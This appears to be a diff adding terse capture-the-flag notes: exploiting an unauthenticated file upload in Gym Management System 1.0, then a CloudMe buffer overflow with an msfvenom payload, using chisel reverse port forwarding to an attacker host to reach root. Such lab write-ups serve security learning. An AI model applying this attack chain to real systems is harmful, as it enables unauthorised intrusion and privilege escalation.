@@ -1,0 +1,6 @@
+nmap --> port 8080 --> gym management system 1.0 --> exploit-db --> unauthenticated file upload --> user.txt
+in user's downloads folder cloudme.exe --> exploit-db --> vulnerable to BoF
+download exploit code --> modify exploit code with msfvenom generated payload
+netstat -an to check cloudme listen port --> 8888 but on localhost
+port forwarding with chisel --> on attacking machine (linux): sudo ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse --> on target (windows): .\chisel.exe client <attacker_ip>:<listen_port> R:<port_to_be_forwarded:127.0.0.1:<port_to_be_forwarded>
+run moded python BoF exploit --> root
